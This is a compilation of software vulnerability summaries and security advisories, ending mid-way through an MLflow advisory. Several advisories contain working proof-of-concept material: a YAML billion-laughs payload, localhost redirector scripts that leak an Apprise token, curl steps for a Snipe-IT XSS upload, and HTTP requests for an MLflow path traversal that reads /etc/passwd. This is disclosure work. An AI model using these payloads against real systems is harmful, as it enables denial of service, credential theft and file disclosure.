cves.summary:
Use after free in mod_auth_digest in Apache Software Foundation Apache HTTP Server before 2.4.69 on all platforms allows an unauthenticated remote client to cause authentication state corruption via concurrent Digest authentication requests when AuthDigestNcCheck is enabled or AuthDigestNonceLifetime is set to 0.

Users are recommended to upgrade to version 2.4.69, which fixes this issue.

Stack-based buffer overflow in mod_vhost_alias in Apache Software Foundation Apache HTTP Server through 2.4.68 on all platforms allows a remote client to cause a denial of service or potentially execute arbitrary code via an HTTP request with a Host header exceeding 8192 bytes when VirtualDocumentRoot uses a hostname format specifier and LimitRequestFieldSize is raised above the default.

Users are recommended to upgrade to version 2.4.69, which fixes this issue.

A flaw was found in the Device Authorization Grant flow of Keycloak, an identity and access management solution. The issue occurs because the token redemption process fails to check if a user account is currently locked due to brute-force protection. If an attacker has an active session for a locked account, they can complete the device login process and receive new security tokens. This allows the attacker to maintain access to the account even when it should be temporarily disabled to prevent unauthorized entry.

An issue was discovered in Bosch Sensortec COINES_SDK versions 2.0 through 2.11. 

The host streaming API function {{coines_read_stream_sensor_data()}} fails to validate the boundaries of the caller-provided destination buffer.

Internally, the stream processing mechanism in {{comm_intf_process_stream_response()}} discards the requested {{number_of_samples}} argument and copies the entirety of the streaming ring buffer's accumulated data into {{coines_stream_rsp_buf}}.

Subsequently, {{coines_read_stream_sensor_data()}} unconditionally executes a {{memcpy}} of the ring buffer size into the caller-provided buffer without verifying if the destination memory allocation is large enough.

A malicious or compromised hardware board connected via USB or BLE can exploit this by streaming a high volume of sensor samples, causing a heap or stack-based buffer overflow on the host desktop environment.

This can result in a Denial of Service (DoS) or potential arbitrary code execution on the host machine.

A heap-based buffer overflow vulnerability in the PC bridge protocol decoder of BoschSensortec COINES_SDK (versions 2.10 through 2.12.2) allows attackers to cause a denial of service (process crash) or potentially execute arbitrary code. 

The bridge decoder ({{bridge_decoder.c}}) trusts the packet length field provided by the external device and forwards it to the host response queue ({{mqueue_add_data}}) without validating the bounds of the destination buffer. 

A malicious or compromised USB or Bluetooth Low Energy (BLE) peripheral can advertise a payload size up to ~3 KB, which exceeds the default queue slot size of 255 bytes. 

This results in an unbounded heap overwrite ({{memcpy}}), corrupting adjacent heap metadata on the host system when processing the device's response.

A flaw was found in the skupper-router component of Red Hat Service Interconnect, which is used to provide secure communication between distributed services. The issue occurs when the router processes a specially crafted network message using its AMQP field parser. Due to a lack of bounds on recursion during parsing, the router can run out of stack memory and crash, leading to a denial of service for the interconnected network.

A stack-based buffer overflow vulnerability exists in the Bosch Sensortec BHI385 SensorAPI (C library) within the debug message parser function bhi385_parse_debug_message (located in bhi385_parse.c). 

The function parses FIFO events and extracts an 8-bit message length directly from the attacker-controlled event payload (callback_info->data_ptr[0]) without enforcing bounds checks or clamping the value.

When copying the payload into a fixed-size stack buffer of 17 bytes (uint8_t debug_msg[17]) via memcpy, providing a length byte greater than 16 causes the function to write past the allocated stack boundary. 

This memory corruption can be triggered by a malicious or compromised sensor or bus participant, leading to a firmware crash, Denial of Service (DoS), or potentially the execution of arbitrary code via adjacent stack data corruption.

### Impact

Sensitive information exposure in the Infracost Terraform Cloud/Enterprise integration. Several code paths attached a configured secret token to a request whose host was taken straight from the scanned Terraform, with no check that the host was the trusted endpoint. 

The condition that matters is whether a Terraform Cloud/Enterprise (or registry) token is present in the run: if one is, the injected hostname can disclose it. Impact therefore depends on the trigger. Under `on: pull_request` (the only configuration in Infracost's documentation) fork pull requests run without secrets, so no token is present. It only reaches token disclosure under `pull_request_target`, a same-repository pull request, or another CI setup that provides the token alongside untrusted Terraform, and exploiting an untrusted fork pull request also typically needs a maintainer to approve the workflow run. The patch scopes the token to the trusted host regardless of trigger.

### Patches

Fixed in `v0.10.45` ([#3590](https://github.com/infracost/infracost/pull/3590)) by attaching a token only when the destination host matches the configured trusted host; otherwise Infracost refuses to send it and skips remote variable loading
  - Installed via the official script, a package manager, or the `latest` Docker tag: upgrade to `v0.10.45` (or later) to receive the fix.
  - Pinned to a specific version or image digest: bump to `v0.10.45`.

### Workarounds

No full fix without upgrading. To limit exposure: use `on: pull_request` rather than `pull_request_target`, pin `organization`, `workspace`, and `host` in Infracost config so the `.tf` hostname is ignored, and keep Terraform Cloud and registry tokens out of runs that process untrusted pull request content.
Directory traversal vulnerability in sample_showcode.html in Caravan 2.00/03d and earlier allows remote attackers to read arbitrary files via the fname parameter.
IBM WebSphere Application Server 3.02 through 3.53 uses predictable session IDs for cookies, which allows remote attackers to gain privileges of WebSphere users via brute force guessing.

### Impact
There is a Cross-Site-Scripting vulnerability in the minute editor conflict UI tha's shown when concurrent edits are made to the same minutes in an event.

### Patches
You should to update to [Indico 3.3.13](https://github.com/indico/indico/releases/tag/v3.3.13) as soon as possible.
See [the docs](https://docs.getindico.io/en/stable/installation/upgrade/) for instructions on how to update.

### Workarounds
- Set `CSP_ENABLED = True` in `indico.conf` - **this is recommended regardless of updating**.
- Only let trustworthy users create content (including minutes which speakers can typically do as well) on Indico.

### For more information
If you have any questions or comments about this advisory:

- Open a thread in [our forum](https://talk.getindico.io/)
- Email us privately at [indico-team@cern.ch](mailto:indico-team@cern.ch)

cves.summary: Memory leak in lofiadm in Solaris 8 allows local users to cause a denial of service (kernel memory consumption).

The Winsock Proxy service in Microsoft Proxy Server 2.0 and the Microsoft Firewall service in Internet Security and Acceleration (ISA) Server 2000 allow remote attackers to cause a denial of service (CPU consumption or packet storm) via a spoofed, malformed packet to UDP port 1745.

### Impact

A small YAML OpenAPI document containing nested anchors and aliases can cause uncontrolled resource consumption in Microsoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers. The issue affects OpenAPI document parsing through the public YAML reader APIs and can cause the parsing process to allocate excessive memory and terminate through out-of-memory conditions.

## Affected versions

### Microsoft.OpenApi.YamlReader

* `>= 2.0.0-preview.11, < 2.12.0`
* `>= 3.0.0, < 3.10.0`

### Microsoft.OpenApi.Readers

* `< 1.6.30`

### Patches

* For the 1.X major version, versions 1.6.30 and above are patched.
* For the 2.X major version, versions 2.12.0 and above are patched.
* For the 3.X major version, versions 3.10.0 and above are patched.

## Impact

Applications, CLIs, developer tools, or services that parse untrusted YAML OpenAPI documents in-process may be terminated by a crafted YAML document containing nested anchors and aliases.

The impact is availability/process termination only. This report does not claim remote code execution, authentication bypass, credential exposure, privilege escalation, data exposure, or Microsoft hosted service impact.

## Details

Microsoft.OpenApi.YamlReader and Microsoft.OpenApi.Readers parses YAML through SharpYaml. SharpYaml represents aliases as shared `YamlNode` instances in a directed acyclic graph, so the initial parsed YAML graph remains small. During conversion to `System.Text.Json.Nodes.JsonNode`, aliases must be materialized as independent nodes because `JsonNode` instances cannot be attached to multiple parents.

Without a bound on that conversion work, a small YAML document using nested anchors and aliases can expand exponentially during conversion. With `N` nested anchors each referenced `k` times, conversion can require `k^N` materialized JSON nodes, leading to excessive memory allocation and possible process termination.

This is an uncontrolled resource consumption vulnerability, also known as a "billion laughs" style denial of service.

### Example payload

```yaml
openapi: 3.0.0
info:
  title: Test
  version: 0.0.1
paths: {}
x-a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
x-b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
x-c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
x-d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
x-e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
x-f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]
```

## Remediation

Users should upgrade to Microsoft.OpenApi.YamlReader `2.12.0` or `3.10.0`, or Microsoft.OpenApi.Readers `1.6.30`, depending on the major version line they consume.

The patched versions bound YAML-to-JSON conversion work and fail fast instead of allowing unbounded expansion. The default limits are:

* Maximum materialized node count: `5,000,000`
* Maximum nesting depth: `64`

When the limits are exceeded, `OpenApiYamlReader.Read` reports an `OpenApiDiagnostic` error and does not return a parsed document.

The limits are exposed as process-wide static properties on `YamlConverter` for consumers that need to tune them for trusted workloads:

* `YamlConverter.MaxNodeCount`
* `YamlConverter.MaxDepth`

Applications that parse OpenAPI documents from untrusted sources should avoid parsing those documents in the primary application process when possible. Running parsing in an isolated process can reduce the blast radius of parser failures.

BBOT's `unarchive` module rejects archives containing symlink entries before extraction, but for zip and 7z archives it failed to detect symlinks whose listing carries a DOS-attribute prefix before the unix mode, as produced by legacy versions of p7zip. Such an archive, downloaded and extracted during a scan (for example via `filedownload`), bypassed the guard and caused an attacker-controlled symlink to be written into the extraction directory. The effect is limited to planting the symlink (its target is not written through), and only hosts using such a legacy p7zip build are affected; current mainline 7-Zip is not.

cves.summary:
## Summary

Metalama loaded and executed compile-time assemblies, auxiliary executable tools, and embedded helper assemblies from predictable temporary directories. On Linux and macOS the default cache location was the world-writable system temporary directory (`Path.GetTempPath()`, i.e. `/tmp`), and previously-generated artifacts were trusted based on the presence of a sentinel/`.completed` marker file rather than on any integrity verification.

A local, unprivileged user on a shared machine or CI/build agent can pre-create the deterministic cache directory structure and plant a malicious DLL together with the matching sentinel file. When a higher-privileged user (or build/service account) subsequently runs a build, Metalama finds the sentinel, skips regeneration, and loads and executes the attacker-supplied assembly inside the compiler / IDE / MSBuild process.

Affected load-and-execute paths:
- the cache of compile-time assemblies that Metalama generates from your aspects;
- auxiliary executable tools that Metalama extracts to a local directory and then launches;
- embedded .NET helper assemblies that Metalama extracts to a local directory and loads into the build / IDE process.

## Impact

Arbitrary code execution in the security context of the building user — i.e. a local privilege escalation across user accounts on shared POSIX systems (multi-user developer machines, CI/build agents). The attacker obtains code execution as the victim without holding the victim's privileges, and can read source/secrets, tamper with build output (supply-chain injection), or disrupt builds.

## Affected configurations

- **Linux and macOS, default configuration — affected.** The shipped default uses the world-writable system temp directory.
- **Windows, default configuration — not affected.** The default per-user temporary directory is protected by OS ACLs, so cross-user planting is not possible.
- The `METALAMA_TEMP` environment variable is a deployer-controlled override and is **out of scope**: pointing it at an insecure (e.g. world-writable or attacker-owned) location is a deployment misconfiguration, not a defect in the product.

## Severity

CVSS v3.1: `AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H` = **8.2 (High)** for the affected POSIX default configuration (Scope:Changed reflects the cross-user privilege escalation).

CVSS v4.0 cross-check: `CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:L/VI:H/VA:L/SC:L/SI:H/SA:H` = 6.0 (Medium), which more granularly attributes low impact to the cache itself and high impact to the subsequent build process. The honest range is therefore Medium-High depending on the scoring model and platform.

## Fix

Caches and extraction directories were relocated from the world-writable system temp directory to per-user application-data locations (`$XDG_CACHE_HOME` / `~/.cache/Metalama` on POSIX), relying on OS-enforced per-user ownership as the trust boundary. Fixed in **2026.1.19**.

## Weaknesses

- CWE-377: Insecure Temporary File
- CWE-427: Uncontrolled Search Path Element

## Affected packages

- Metalama.Framework < 2026.1.19, 
- Metalama.Tool < 2026.1.19

Internal tracking: metalama/Metalama#1650.

# Summary

Apprise's HTTP-based notification plugins and its HTTP attachment / config loaders (`apprise/attachment/http.py`, `apprise/config/http.py`) follow HTTP 3xx redirects by default and **re-send the user-configured auth headers and query parameters on the redirected request**. If an operator-configured destination is later compromised (service takeover, malicious update), or an attacker holds a MITM position on an unprotected network path, that destination can return a `302 Location:` to an arbitrary host and Apprise forwards the user's secret (`X-Gotify-Key`, `Authorization`, bearer tokens in query, custom `+Header=` values) to that cross-origin host. The attacker does **not** need to control the original Apprise URL — only the response from a destination the operator already trusts.

This is the application-layer analogue of urllib3 [`GHSA-34jh-p97f-mpxf`](https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf) / `CVE-2026-44431` ("`Proxy-Authorization` forwarded across cross-origin redirect").

# Affected versions

All releases up to and including `v1.10.0` (latest PyPI release as of filing, 2026-04-26). Fixed in v1.11.0 (released 2026-05-29), which includes [PR #1610](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit 68c0aef218055e4586cf4605fd6b56358f5f462d).

# Details

`apprise/plugins/gotify.py` (pre-fix HEAD, lines 226-244, verbatim):

```python
headers = {
    "User-Agent": self.app_id,
    "Content-Type": "application/json",
    "X-Gotify-Key": self.token,    # user-supplied secret
}
...
r = requests.post(
    url,
    data=dumps(payload),
    headers=headers,
    verify=self.verify_certificate,
    timeout=self.request_timeout,
    # NO allow_redirects=False -- requests default is True
)
```

`requests` follows 3xx redirects by default and re-attaches the `headers=` dict on the redirected request, regardless of origin. The same shape exists across ~50 plugins (`custom_json`, `custom_xml`, `custom_form`, `gotify`, `ntfy`, `mattermost`, `apprise_api`, and most other HTTP-based plugins), plus in `apprise/attachment/http.py` and `apprise/config/http.py`.

## Reproduction (local, safe)

```python
# attacker_redirector.py -- 127.0.0.1:8081 returns 302 to a cross-origin sink
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:8082/exfil")
        self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8081), H).serve_forever()
```

```python
# attacker_sink.py -- 127.0.0.1:8082 logs the leaked headers
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        print("LEAKED HEADERS:", dict(self.headers))
        self.send_response(204); self.end_headers()
http.server.HTTPServer(("127.0.0.1", 8082), H).serve_forever()
```

```python
# victim
from apprise import Apprise
a = Apprise()
a.add("gotify://127.0.0.1:8081?token=SECRETTOKEN")
a.notify(body="x")
```

Observed on `master` HEAD (2026-05-13): `attacker_sink.py` prints `X-Gotify-Key: SECRETTOKEN` -- the user-supplied token followed the cross-origin redirect.

# Patch

Fix landed in [`caronc/apprise#1610`](https://github.com/caronc/apprise/pull/1610) (merged 2026-05-16, commit `68c0aef`):

- Adds `?redirect=yes|no` URL parameter on every plugin URL
- Adds `AppriseAsset.http_redirects` global default
- Equivalent flags wired into `apprise/attachment/http.py` and `apprise/config/http.py`

The default remains `redirects=True` for backwards compatibility -- operators who relay notifications through destinations they don't fully trust should append `?redirect=no` to their Apprise URLs or set `AppriseAsset(http_redirects=False)` globally.

Released in v1.11.0 (2026-05-29, available on PyPI).

Related:
- Documentation: [`caronc/apprise-docs#60`](https://github.com/caronc/apprise-docs/pull/60) (merged 2026-05-16)
- API counterpart: [`caronc/apprise-api#331`](https://github.com/caronc/apprise-api/pull/331) (merged 2026-05-29; shipped in apprise-api v1.5.1, built on Apprise v1.11.0)

# Remediation

Upgrade to Apprise v1.11.0 or later (`pip install -U apprise`).

The default remains `redirect=yes` for backwards compatibility, so after upgrading, operators who relay notifications through destinations they don't fully trust should also set `AppriseAsset(http_redirects=False)` globally or append `?redirect=no` to each plugin URL.

If you cannot upgrade yet, operate Apprise only against fully trusted notification destinations (the maintainer-documented supported model).

# Classification

- **CWE-200** Exposure of Sensitive Information to an Unauthorized Actor -- user's auth tokens / API keys / custom `+Header=` values are forwarded onto the cross-origin redirected request.
- **CWE-601** URL Redirection to Untrusted Site -- a 3xx response from the initial (operator-configured) target sends the request and its credentials to a host the operator never configured.

CVSS 3.1: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` -> **3.1 LOW**.

Attack requires the operator-configured destination to be compromised or an attacker to be on the network path. Impact is partial confidentiality loss: a single user-supplied secret per redirected request, scoped to that one notification channel. This is intentionally a narrow redirect/header-forwarding hardening issue, not a claim that remote destinations or remote configuration are themselves vulnerabilities.

cves.summary:
Snipe-IT's uploaded-files API accepts XML documents and later serves them inline without applying the safe-inline allowlist used by the equivalent web controller. An authenticated user who can attach files to a supported object can upload an XSLT stylesheet and an XML document that references it through xml-stylesheet. When another authorized user opens the XML file through the API with ?inline=true, the browser applies the attacker-controlled stylesheet, which produces HTML containing JavaScript in the Snipe-IT origin. This was reproduced against commit df8e3b144331d0c1cc14778f900e7646d1d9a509 (v8.6.3-231-gdf8e3b1443). The attack requires an authenticated account with file access to at least one supported object and one victim interaction. Scope changes because attacker-controlled code executes in another user's Snipe-IT security context. The script can read same-origin data available to the victim and perform authenticated actions as that victim. ### Affected Components - app/Http/Requests/UploadFileRequest.php Allows xml uploads through filesystems.allowed_upload_extensions_for_validator. Sanitizes only files detected as image/svg+xml. Both files in this proof of concept are detected by PHP finfo as text/xml, so they are stored unchanged. - config/filesystems.php Includes xml in allowed_upload_extensions_array. - app/Http/Controllers/Api/UploadedFilesController.php, method show() Honors the attacker-controlled inline=true query parameter for every uploaded file type. Calls Storage::download(..., ['Content-Disposition' => 'inline']) without calling StorageHelper::allowSafeInline(). - routes/api.php Exposes the affected route as GET /api/v1/{object_type}/{id}/files/{file_id} for multiple object types. - app/Http/Middleware/SecurityHeaders.php The default CSP includes script-src 'self' 'unsafe-inline' 'unsafe-eval', so it does not mitigate the injected inline script. The non-API UploadedFilesController::show() already calls StorageHelper::allowSafeInline() before returning an inline response. The missing equivalent check in the API controller creates the vulnerable behavior. Root Cause File validation treats XML as an allowed attachment format, but the API download path treats all accepted formats as safe active browser content. Extension allowlisting for upload is not equivalent to determining whether a response is safe to render inline. Laravel derives the response Content-Type from each stored file. It returns text/xml; charset=utf-8, while the controller overrides the normal attachment disposition with Content-Disposition: inline. Chromium processes the xml-stylesheet instruction, loads the second same-origin API attachment as XSLT, and executes script in the HTML document produced by the transform. An attacker can execute arbitrary JavaScript in the Snipe-IT origin when a victim opens the malicious attachment URL. Depending on the victim's privileges, this can enable: - Reading same-origin pages and API responses available to the victim. - Performing state-changing actions with the victim's session and privileges. - Exposing sensitive asset, user, license, and configuration information. - Administrative account compromise when a superuser opens the attachment. - Cookies marked HttpOnly cannot be read directly, but this does not prevent same-origin authenticated requests or reading their responses. ## Proof of Concept ### Preconditions - Snipe-IT is installed with default XML upload support. - The attacker has an API token for a user permitted to manage files on a supported object. - The victim is authenticated and permitted to view files on that object. 1. Create the malicious XSLT file Save the following as style.xml: ```xml BEFORE
NOT_EXECUTED
 ``` PHP finfo identifies this file as `text/xml`, not `image/svg+xml`. 2. Upload the stylesheet through the API Replace the base URL, token, object type, and object ID with values from the test instance: ``` curl -i \ -H 'Authorization: Bearer ATTACKER_API_TOKEN' \ -H 'Accept: application/json' \ -F 'file[]=@style.xml;type=text/xml' \ 'https://snipe-it.example/api/v1/models/1/files' ``` Expected result: HTTP 200 and a successful upload response. 3. Obtain the stylesheet file ID ``` curl -s \ -H 'Authorization: Bearer ATTACKER_API_TOKEN' \ -H 'Accept: application/json' \ 'https://snipe-it.example/api/v1/models/1/files' ``` Read the style.xml upload's id from the response and call it STYLE_FILE_ID. 4. Create and upload the referencing XML document Save this as data.xml, replacing STYLE_FILE_ID: ``` test PHP finfo also identifies this file as text/xml. curl -i \ -H 'Authorization: Bearer ATTACKER_API_TOKEN' \ -H 'Accept: application/json' \ -F 'file[]=@data.xml;type=text/xml' \ 'https://snipe-it.example/api/v1/models/1/files' ``` List the files again and obtain the id of data.xml; call it DATA_FILE_ID. 5. Trigger the vulnerability While authenticated in the Snipe-IT web interface as a victim who can view the object's files, open the following in the same browser. The normal Snipe-IT Passport cookie authenticates both same-origin API requests: `https://snipe-it.example/api/v1/models/1/files/DATA_FILE_ID?inline=true` Expected vulnerable response characteristics: ``` HTTP/1.1 200 OK Content-Type: text/xml Content-Disposition: inline Content-Security-Policy: ...; script-src 'self' 'unsafe-inline' 'unsafe-eval'; ... ``` Browser result: the page title changes to SNIPE_XSS, and the displayed text changes from NOT_EXECUTED to XSS_EXECUTED. ### Fixed Fixed in https://github.com/grokability/snipe-it/commit/e929b31f0b183c5810bd2b833c1f6f643cbe5284

In the Linux kernel, the following vulnerability has been resolved:

usb: typec: ucsi: unregister debugfs entries on teardown

ucsi_register() creates per-instance debugfs entries, but
ucsi_unregister() keeps them around until ucsi_destroy().

Drivers like ucsi_glink that unregister/register the same UCSI
instance across remoteproc restart then try to create an already
existing debugfs directory and log:

  debugfs: 'pmic_glink.ucsi.0' already exists in 'ucsi'

Unregister debugfs entries as part of ucsi_unregister(), and
clear ucsi->debugfs after freeing it so repeated unregister
paths remain safe.
X fontserver xfs allows local users to cause a denial of service via malformed input to the server.
SolarWinds TFTP server 5.0.55 and earlier allows remote attackers to cause a denial of service (crash) via a large UDP datagram, possibly triggering a buffer overflow.
Buffer overflow in trek on NetBSD 1.5 through 1.5.3 allows local users to gain privileges via long keyboard input.

Directory traversal vulnerability in CooolSoft Personal FTP Server 2.24 allows remote attackers to read or modify arbitrary files via .. (dot dot) sequences in the commands (1) LIST (ls), (2) mkdir, (3) put, or (4) get.
Bugzilla before 2.14 does not restrict access to sanitycheck.cgi, which allows local users to cause a denial of service (CPU consumption) via a flood of requests to sanitycheck.cgi.

process_bug.cgi in Bugzilla before 2.14 does not set the "groupset" bit when a bug is moved between product groups, which will cause the bug to have the old group's restrictions, which might not be as stringent.
nph-maillist.pl allows remote attackers to execute arbitrary commands via shell metacharacters ("`") in the email address.
Directory traversal vulnerability in ST FTP Service 3.0 allows remote attackers to list arbitrary directories via a CD command with a DoS drive letter argument (e.g. E:).

Privacyware Privatefirewall 3.0 does not block certain incoming packets when in "Filter Internet Traffic" or Deny Internet Traffic" modes, which allows remote attackers to identify running services via FIN scans or Xmas scans.
objects.inc.php4 in BLNews 2.1.3 allows remote attackers to execute arbitrary PHP code via a Server[path] parameter that points to malicious code on an attacker-controlled web site.

Ultimate PHP Board (UPB) 1.9 allows remote attackers to execute arbitrary PHP code with UPB administrator privileges via an HTTP request containing the code in the User-Agent header, which is executed when the administrator executes admin_iplog.php.
Buffer overflow in les for ATM on Linux (linux-atm) before 2.4.1, if used setuid, allows local users to gain privileges via a long -f command line argument.

Buffer overflow in FastTrack (FT) network code, as used in Kazaa 2.0.2 and possibly other versions and products, allows remote attackers to execute arbitrary code via a packet containing a large list of supernodes, aka "Packet 0' death."

Vignette StoryServer 4 and 5, and Vignette V/5 and V/6, with the SSI EXEC feature enabled, allows remote attackers to execute arbitrary code via a text variable to a Vignette Application that is later displayed.

Vignette StoryServer 4 and 5, Vignette V/5, and possibly other versions allows remote attackers to perform unauthorized SELECT queries by setting the vgn_creds cookie to an arbitrary value and directly accessing the save template.
Buffer overflow in SH39 MailServer 1.21 and earlier allows remote attackers to cause a denial of service, and possibly execute arbitrary code, via a long command to the SMTP port.

Directory traversal vulnerability in Endymion MailMan before 3.1 allows remote attackers to read arbitrary files via a .. (dot dot) and a null character in the ALTERNATE_TEMPLATES parameter for various mmstdo*.cgi programs.
Buffer overflow in GuildFTPd Server 0.97 allows remote attacker to execute arbitrary code via a long SITE command.
Spytech SpyAnywhere 1.50 allows remote attackers to gain administrator access via a single character in the "loginpass" field.

Buffer overflows and other vulnerabilities in multiple Common Desktop Environment (CDE) modules in HP-UX 10.10 through 11.11 allow attackers to cause a denial of service and possibly gain additional privileges.

Oracle E-Business Suite Release 11i Applications Desktop Integrator (ADI) version 7.x includes a debug version of FNDPUB11I.DLL, which logs the APPS schema password in cleartext in a debug file, which allows local users to obtain the password and gain privileges.
OpenSSH version 2.9 and earlier, with X forwarding enabled, allows a local attacker to delete any file named 'cookies' via a symlink attack.
Spearhead NetGAP 200 and 300 before build 78 allow a remote attacker to bypass file blocking and content inspection via specially encoded URLs which include '%' characters.
Buffer overflow in libi18n library in IBM AIX 5.1 and 4.3.x allows local users to gain root privileges via a long LANG environmental variable.
AppleFileServer (AFS) in Apple Mac OS X 10.2.8 and 10.3.2 does not properly handle certain malformed requests, with unknown impact.

### Summary
On MLflow tracking servers running without authentication, which is the default for mlflow server, a remote attacker can read arbitrary files from the server’s filesystem by creating a model version tagged as a prompt whose source is a schemeless local path.

The fix for CVE-2026-2614 in 3.10.0 added a prompt-specific branch to the `CreateModelVersion` handler that rejects `file://` URIs and absolute paths but runs path validation only when the source carries a URL scheme. A schemeless value such as `../../etc`, a plain relative name, `.`, a percent-encoded path, or a Windows drive-letter path is therefore stored unchanged as the model version’s artifact location, and the `model-versions/get-artifact endpoint` later serves files from it with the privileges of the server process. The tag check also keyed on the presence of the `mlflow.prompt.is_prompt` tag rather than its value, so a false value still selected the weaker branch.

Servers using `--app-name basic-auth` are also affected: any authenticated user can create a registered model, so a low-privilege account can use this to read the authentication database, including the admin password hash.

Affected: MLflow 3.10.0 through 3.16.1. Fixed in 3.17.0 by [mlflow/mlflow#25870](https://github.com/mlflow/mlflow/pull/25870), which accepts only MLflow’s own placeholder sources for prompt versions and requires the prompt tag to be `true`.

### Details
When creating a model version with the `mlflow.prompt.is_prompt` tag set to true, the request is handled by the prompt branch in `_create_model_version()`.

`mlflow/server/handlers.py:2674-2690`:
```python
is_prompt = _is_prompt_request(request_message)
if is_prompt:
    source = request_message.source
    parsed = urllib.parse.urlparse(source)
    if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):
        raise MlflowException(...)
    if parsed.scheme:
        _validate_non_local_source_contains_relative_paths(source)
else:
    if request_message.model_id:
        _validate_source_model(request_message.source, request_message.model_id)
    else:
        _validate_source_run(request_message.source, request_message.run_id)
```
The prompt branch does not call `_validate_source_run()`, `_validate_source_model()`, or `_validate_non_local_source_contains_relative_paths()` for schemeless relative paths.

The artifact-read sink later trusts the stored source:

`mlflow/server/handlers.py:2765-2782`:
```python
def get_model_version_artifact_handler():
    name = request.args.get("name")
    version = request.args.get("version")
    path = request.args["path"]
    path = validate_path_is_safe(path)
    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)
    ...
    else:
        artifact_repo = get_artifact_repository(artifact_uri)
        artifact_path = path

    return _send_artifact(artifact_repo, artifact_path)
```
`_send_artifact()` calls `artifact_repository.download_artifacts(path)` and serves the resulting local file with `send_file()`.

### PoC
Prerequisite: A reachable MLflow tracking server with model registry endpoints enabled.

1. Create a sentinel file on the server:
```bash
printf 'MLFLOW_PWNED_SENTINEL_REPORT' > /tmp/sentinel-mlflow.txt
```

2. Send the following requests to the MLflow server to exploit the traversal:

First, create a registered model:
```http
POST /api/2.0/mlflow/registered-models/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{"name": "pwned-model"}
```

Next, create a prompt-tagged model version with the malicious relative source `../../../tmp`:
```http
POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{
  "name": "pwned-model",
  "source": "../../../tmp",
  "tags": [{"key": "mlflow.prompt.is_prompt", "value": "true"}]
}
```

Finally, retrieve the arbitrary file via the artifact download endpoint by supplying the target filename in the `path` parameter:
```http
GET /api/2.0/mlflow/model-versions/get-artifact?name=pwned-model&version=1&path=sentinel-mlflow.txt HTTP/1.1
Host: 127.0.0.1:5000
```
This returns the contents of `/tmp/sentinel-mlflow.txt`. The same primitive can read sensitive files like `/etc/passwd` or tracking databases (e.g. `mlflow.db`).

### Impact
Direct impact is arbitrary local file read as the MLflow server process. Confirmed read targets include:
- `/etc/passwd`
- SQLite tracking databases readable by the process (e.g., `mlflow-auth.db` or `basic_auth.db`)
- Environment variables or configurations stored on disk
- `/home/user/.bash_history`

Threat model: An attacker who can reach the MLflow tracking server HTTP port can read arbitrary files readable by the MLflow server process. On unauthenticated MLflow deployments, this is directly exploitable without credentials. On auth-enabled deployments, any authenticated user (even low-privileged or "read-only" accounts, depending on default RBAC configurations allowing model creation) can use the primitive. Leaked credential stores may enable offline password attacks or broader administrative compromise.

cves.summary:
### Summary

`mlflow.crewai.autolog()` leaks CrewAI LLM provider API keys into MLflow trace telemetry.

When a CrewAI `Agent` is instrumented with MLflow autologging, MLflow serializes the agent's `__dict__` and converts its fields to strings. The `llm` field contains the CrewAI LLM object, whose string representation includes its `api_key` in plaintext.

As a result, an application that calls `mlflow.crewai.autolog()` can unintentionally send its LLM provider API key to the MLflow trace backend or configured OTLP destination.

The application does not need to explicitly log the credential or place it in a span attribute. The credential is extracted automatically by MLflow's instrumentation.

This was verified on **MLflow 3.16.0** with **CrewAI 1.15.18** using MLflow's own OTLP exporter. The fake credential appeared in **5 attribute locations across 2 spans**.

### Details

The primary issue is in:

`mlflow/crewai/autolog.py::_get_agent_attributes()`

The function walks the CrewAI `Agent.__dict__` and converts agent fields to strings. `tools` and `embedder` receive special handling, but credential-bearing objects such as the following are not sanitized:

* `llm`
* `function_calling_llm`
* `agent_executor`
* `crew`

For example, `agent.llm` is a CrewAI `LLM` object. In CrewAI 1.15.18, the underlying LLM model contains `api_key` as a normal field. Its string representation therefore contains the credential:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-...' ...
```

MLflow subsequently stores this string as a span attribute.

There is an important indication that this is an unintended disclosure: MLflow's dedicated LLM attribute extraction already explicitly excludes `api_key` in `_get_llm_attributes()`. The LLM span therefore does not expose the credential, while the broader Agent `__dict__` serialization bypasses that protection.

There is also a second, independent serialization path in:

`mlflow/crewai/autolog.py::_construct_full_inputs()`

This code uses:

```python
v.__dict__ if hasattr(v, "__dict__") else v
```

on call arguments. During CrewAI execution, the `Agent` object is passed as an argument, causing its `__dict__` to be expanded and the credential-bearing LLM object to be included in `mlflow.spanInputs`.

Therefore, there are two independent leakage paths:

1. **Agent span attributes** through `_get_agent_attributes()`
2. **Span inputs** through `_construct_full_inputs()`

Fixing only the Agent attribute serialization would leave the `mlflow.spanInputs` path vulnerable.

A safer approach would be to avoid recursively serializing arbitrary object `__dict__` values. Agent telemetry should use an explicit allowlist of non-sensitive scalar fields, and credential-bearing objects such as `llm`, `function_calling_llm`, `agent_executor`, and `crew` should either be reduced to safe metadata or omitted.

Similarly, `_construct_full_inputs()` should not automatically expand arbitrary objects through `__dict__`, or the resulting values should pass through the same sanitization mechanism before being attached to a span.

### PoC

Environment:

```text
MLflow: 3.16.0
CrewAI: 1.15.18
Python: 3.12.3
opentelemetry-exporter-otlp-proto-http: 1.42.1
```

#### 1. Direct serialization proof

The following demonstrates the vulnerability without starting a Crew, making a network request, or requiring an MLflow server:

```python
import importlib
